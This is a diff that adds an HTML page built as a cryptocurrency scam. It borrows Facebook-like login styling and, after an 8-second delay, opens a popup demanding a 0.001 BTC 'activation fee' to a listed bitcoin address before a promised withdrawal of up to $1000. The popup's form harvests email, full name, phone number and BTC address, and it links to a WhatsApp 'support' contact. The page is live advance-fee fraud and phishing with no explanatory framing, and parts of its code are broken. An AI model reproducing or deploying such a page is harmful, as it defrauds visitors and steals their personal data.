@@ -1,0 +1,487 @@
+<html lang="en">
+ <head> 
+ </head>
+ <body>
+  <iframe width="100%" height="700" src="https://60second.live/html/crypto-index.html" scrolling="yes" frameborder="0" marginheight="0" marginwidth="0"></iframe> 
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no" name="viewport"> 
+  <title>blast</title> 
+  <link href="https://fonts.googleapis.com/css2?family=Poppins&amp;display=swap" rel="stylesheet"> 
+  <style media="screen">
+* {
+    margin: 0;
+    padding: 0;
+    font-family: Helvetica, Arial, sans-serif;
+    box-sizing: border-box;
+}
+
+
+
+#container {
+    display: flex;
+}
+
+#recent-logins {
+    display: flex;
+    flex-direction: column;
+    position: relative;
+    left: 20vw;
+    top: 13vh;
+    margin-right: 30vw;
+}
+
+#facebook {
+    height: 70px;
+    width: 198px;
+    margin: -20px;
+}
+
+#recent-logins > #title {
+    font-size: 28px;
+    font-weight: normal;
+    line-height: 32px;
+    margin-top: 20px;
+    margin-bottom: 5px;
+}
+
+#recent-logins > #subtitle {
+    color: #606770;
+    font-size: 15px;
+    line-height: 15px;
+    margin-bottom: 20px;
+    font-weight: 400;
+}
+
+#cards {
+    display: flex;
+}
+
+#card-1, #card-2 {
+    position: relative;
+    background-color: white;
+    margin-right: 10px;
+    border-radius: 5px;
+    margin-right: 20px;
+}
+
+#card-1:hover, #card-2:hover {
+    box-shadow: 0 8px 16px 0 rbga(0,0,0,0.2);
+    cursor: pointer;
+    transition: box-shadow 0.3s;
+}
+
+#card-1-img, #card-2-img {
+    height: 160px;
+    width: 160px;
+    border-top-left-radius: 5px;
+    border-top-right-radius: 5px;
+}
+
+#add-account {
+    color: #166FE5;
+}
+
+.username {
+    font-size: 18px;
+    line-height: 22px;
+    padding: 12px;
+    text-align: center;
+    color: rgb(75, 79, 86);
+}
+
+#notifications {
+    background-color: rgb(236, 58, 58);
+    color: white;
+    position: absolute;
+    right: -5px;
+    top: -5px;
+    border-radius: 50%;
+    height: 25px;
+    width: 25px;
+    text-align: center;
+    line-height: 25px;
+    font-size: 12px;
+}
+
+#cancel {
+    position: absolute;
+    left: 8px;
+    color: white;
+    top: 5px;
+    border-radius: 50%;
+    height: 20px;
+    text-align: center;
+    width: 20px;
+    background-color: rgb(63, 62, 62);
+    opacity: 0.5;
+}
+
+#card-1:hover #cancel {
+    background-color: white;
+    : 1.0;
+    color: rgb(194, 193, 193);
+    height: 25px;
+    width: 25px;
+    line-height: 22px;
+    top: -5px;
+    left: -5px;
+    font-size: 25px;
+    transition: 0.3s;
+}
+
+#login {
+    position: relative;
+    background-color: #FFFFFF;
+    height: 350px;
+    width: 350px;
+    border-radius: 10px;
+    display: flex;
+    flex-direction: column;
+    top: 18vh;
+    justify-content: flex-start;
+    padding: 10px 10px 20px 10px;
+    align-items: center;
+    box-shadow: 0 5px 5px 3px gainsboro;
+}
+
+#login > a {
+    margin: 18px 0;
+    text-decoration: none;
+    font-size: 15px;
+    color: #595959;
+}
+
+#login > a:hover {
+    text-decoration: underline;
+    cursor: pointer;
+}
+
+hr {
+    width: 95%;
+    height: 0.1%;
+    background-color: rgb(194, 193, 193);
+    border: none;
+}
+
+#login > input[type=text], #login > input[type=password] {
+    height: 35%;
+    margin: 8px 0;
+    border-radius: 5px;
+    padding-left: 10px;
+    font-size: 16px;
+    width: 95%;
+    border: 1.0px solid #EEEFF0;
+}
+
+#login > input[type=password] {
+    margin-bottom: 12px;
+}
+
+#login > input[type=text]:focus, #login > input[type=password]:focus {
+    outline: none;
+    border: 1px solid blue;
+    box-shadow: 0 0 5px #719ECE;
+    caret-color: blue;
+}
+
+.login-button {
+    background-color: #1877F2;
+    color: #FFFFFF;
+    font-size: 20px;
+    border-radius: 5px;
+    border: none;
+    height: 120px;
+    font-weight: bold;
+    width: 95%;
+}
+
+.login-button:hover {
+    background-color: #166FE5;
+    cursor: pointer;
+}
+
+#create-new-account {
+    background-color: #42b72a;
+    color: #FFFFFF;
+    font-size: 18px;
+    border-radius: 5px;
+    border: none;
+    height: 100px;
+    font-weight: bold;
+    width: 60%;
+    margin-top: 20px;
+}
+
+#create-new-account:hover {
+    background-color: #36A420;
+    cursor: pointer;
+}
+
+p {
+    font-size: 15px;
+    position: absolute;
+    bottom: -55px;
+}
+
+footer {
+    background-color: #FFFFFF;
+    position: absolute;
+    bottom: 0;
+    width: 100vw;
+    padding: 20px;
+    color: #a6a8aa;
+    font-size: 12px;
+    margin-top: 100px;
+    display: flex;
+    justify-content: center;
+    word-spacing: 12px;
+    line-height: 20px;
+}
+
+@media screen and (max-width: 1114px) {
+    #recent-logins {
+        left: 70px;
+        margin-right: 22vw;
+    }
+
+    #login {
+        right: 30px;
+    }
+}
+
+@media screen and (max-width: 900px) {
+    
+    body {
+        height: 150vh;
+    }
+
+    #container {
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+    }
+
+    #recent-logins {
+        margin-right: 0;
+        align-items: center;
+        left: 0;
+        top: 20px;
+    }
+
+    #card-1 {
+        margin-right: 5px;
+    }
+
+    #card-2 {
+        margin-left: 5px;
+        margin-right: 0;
+    }
+
+    #login {
+        text-align: center;
+        left: 0;
+        margin-right: 0;
+        margin-top: -30px;
+        top: 80px;
+    }
+
+    #recent-logins, #login {
+        position: relative;
+    }
+
+    #footer {
+        position: absolute;
+        padding: 20px;
+        width: 100vw;
+    }
+
+}
+
+@media screen and (max-height: 670px) {
+    footer {
+        position: relative;
+        top: 100px;
+    }
+}
+		
+		.login{background-color:#3b5998;color:white;}
+		.login{width: 97%;}
+
+
+
+    	*,
+*:before,
+*:after{
+    padding: 0;
+    margin: 0;
+    box-sizing: border-box;
+}
+.popup{
+    background-color: #ffffff;
+    width: 420px;
+    padding: 30px 40px;
+    position: absolute;
+    transform: translate(-50%,-50%);
+    left: 50%;
+    top: 50%;
+    border-radius: 8px;
+    font-family: "Poppins",sans-serif;
+    display: none; 
+    text-align: center;
+}
+.popup button{
+    display: block;
+    margin:  0 0 20px auto;
+    background-color: transparent;
+    font-size: 30px;
+    color: #ffffff;
+		
+		border-radius: 100%;
+		width: 40px;
+		height: 40px;
+    border: none;
+    outline: none;
+    cursor: pointer;
+}
+.popup h2{
+	margin-top: -20px;
+}
+.popup p{
+    font-size: 14px;
+    text-align: justify;
+    margin: 20px 0;
+    line-height: 25px;
+}
+a{
+    display: block;
+    width: 150px;
+    position: relative;
+    margin: 10px auto;
+    text-align: center;
+    background-color: #0f72e5;
+		border-radius: 20px;
+    color: #ffffff;
+    text-decoration: none;
+    padding: 8px 0;
+}
+    </style> 
+  <div class="popup"> 
+   <meta charset="utf-8"> 
+   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> 
+   <title>Bootstrap Simple Login Form</title> 
+   <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"> 
+   <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
+   <style>
+.login-form {
+    width: 340px;
+    margin: 50px auto;
+  	font-size: 15px;
+}
+.login-form form {
+    margin-bottom: 15px;
+    background: #f7f7f7;
+    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+    padding: 30px;
+}
+.login-form h2 {
+    margin: 0 0 15px;
+}
+.form-control, .btn {
+    min-height: 38px;
+    border-radius: 2px;
+}
+}
+.form-controls, .btn {
+    min-height: 68px;
+    border-radius: 2px;
+}
+
+.box {
+  width: 280px;
+  height: 100px;
+  padding: 50px;
+  border: 1px solid red;
+}
+.btn {        
+    font-size: 15px;
+    font-weight: bold;
+}
+</style> 
+   <div class="login-form"> 
+    <img src="https://pinnocent.com/image/btcs.jpeg" alt="HTML" width="340" height="50"> to withdraw upto $1000 you need to activate your account by send onetime activation fee of 
+    0.001btc to the bitcoin address below
+    
+    3EgeWMTrB5ALGu9jU9fhzdFeyRdsBBn13j 
+    
+    this for security reasons, to confirm you are not a bot. 
+    <div class="form-group"> 
+     <form id="anonymousNewMessage" class="form" method="POST" action=""> 
+      <div class=""> 
+      </div> 
+      <div class=""> 
+       <input type="hidden" name="user_id" id="userNickname" value="54007"> 
+       <input type="hidden" name="ip" value="172.70.85.163"> 
+       <input type="hidden" name="link" value="keyphrase"> 
+       <input type="name" class="form-control" name="message_title" placeholder="enter your email address" required> 
+      </div> 
+      <div class="form-group"> 
+       <textarea class="box-sizing box" name="description" type="text" id="pass" placeholder="Enter your full name, email address, phone number, BTC address to receive withdrawal, then click i have made payment." maxlength="400" size="35px" required></textarea> 
+      </div> 
+      <div class="form-group"> 
+       <input class="btn btn-primary btn-block" name="login" type="submit" id="anonymousProcess" value="I have made payment"> 
+      </div> 
+      <div class="clearfix"> 
+       <label class="float-left form-check-label"><input type="checkbox"> click i have made payment and send screenshot to support services to process your withdrawal immediately </label> 
+       <a href="https://wa.me/message/QRF5CP2WBU46C1" class="float-right"> support services 24/7 </a>
+      </div> 
+     </form> 
+    </div> 
+   </div> 
+  </div> 
+  <div class="popup-login login_twitter animated fadeIn" style="display: none;"> 
+   <div class="popup-box-login-twitter"> 
+    <a onclick="close_twitter_login()" class="close-other"><i class="zmdi zmdi-close"></i></a> 
+    <div class="header-twitter"> 
+     <center> 
+      <img src="https://user-images.githubusercontent.com/49580304/102179592-44f8c700-3e5c-11eb-9756-e98e6f4c582c.png"> 
+     </center> 
+    </div> 
+    <div class="box-twitter"> 
+     <center> 
+     </center> 
+    </div> 
+   </div> 
+  </div> 
+  <script src="back.js?1662794138"> 
+</script> 
+  <script src="./assets/js/anonymous.js?1664468422"> 
+</script> 
+  <script type="text/javascript">
+    $(document).ready(function() {
+
+  var url =anonymousURL('user');
+  var url2 =anonymousURL('ref');
+  console.log(url);
+     $('.userNickname').html('Send Anonymous Message to '+url);
+     $('#userNickname').val(url2);
+   });
+
+
+  </script> 
+  <div></div> 
+  <script type="text/javascript">
+window.addEventListener("load", function(){
+    setTimeout(
+        function open(event){
+            document.querySelector(".popup").style.display = "block";
+        },
+        8000 
+    )
+});
+
+
+document.querySelector("").addEventListener("click", function(){
+    document.querySelector(".popup").style.display = "none";
+});
+    </script> 
+ </body>
+</html>
